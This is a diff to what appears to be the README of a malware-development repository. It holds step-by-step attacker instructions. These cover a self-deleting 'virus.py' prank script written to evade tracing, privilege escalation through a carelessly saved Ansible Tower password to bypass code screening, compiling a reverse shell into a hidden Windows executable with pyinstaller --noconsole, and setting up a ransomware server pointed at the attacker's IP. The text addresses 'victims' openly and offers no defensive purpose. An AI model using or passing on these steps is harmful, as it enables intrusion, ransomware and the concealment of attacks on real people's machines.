@@ -52,7 +52,7 @@
 ## Bash terminal:
 ## printf "import time, rotatescreen as rs\npd = rs.get_primary_display()\nangle_list = [0, 90, 180, 270, 90, 180, 90, 270]\nwhile True:\n\tfor i in range(5):\n\t\tfor x in angle_list:\n\t\t\tpd.rotate_to(x)\n\t\t\ttime.sleep(0.5)" > virus.py &&
 ## python ./virus.py &&
-## rm -rf tempDir/virus.py
+## rm -rf ./virus.py
 ## 
 ## Approach 4
 ## Grab an Ansible Tower => Enumerate a user with careless saved password for Privilege Escalation => using "commands" entry to bypass artifactory code screening with using a playbook
@@ -65,7 +65,7 @@
 ## Bash terminal:
 ## printf "import time, rotatescreen as rs\npd = rs.get_primary_display()\nangle_list = [0, 90, 180, 270, 90, 180, 90, 270]\nwhile True:\n\tfor i in range(5):\n\t\tfor x in angle_list:\n\t\t\tpd.rotate_to(x)\n\t\t\ttime.sleep(0.5)" > virus.py &&
 ## python ./virus.py &&
-## rm -rf tempDir/virus.py
+## rm -rf ./virus.py
 ##
 ## Thus, no one can easily trace what the heck you did to them
 ##
@@ -84,6 +84,8 @@
 ## ============================================
 ## Backdoor
 ## cd Malware-Dev/Backdoor => compile reverse_shell.py to reverse_shell.exe
+## by
+## python -m pyinstaller ./reverse_shell.py --onefile --noconsole;
 ##
 ## Victims' machines:
 ## Use your creativity to find the way to run reverse_shell.exe or just the code in reverse_shell.py
@@ -108,7 +110,7 @@
 ## to your attacker machine IP
 ## 
 ## Run the server.py to start listening
-## python ./Ransomware/server.py;
+## python ./server.py;
 ##
 ## On your victim's machine 
 ## Edit the IP_ADDRESS in line 109 to attacker's machine IP
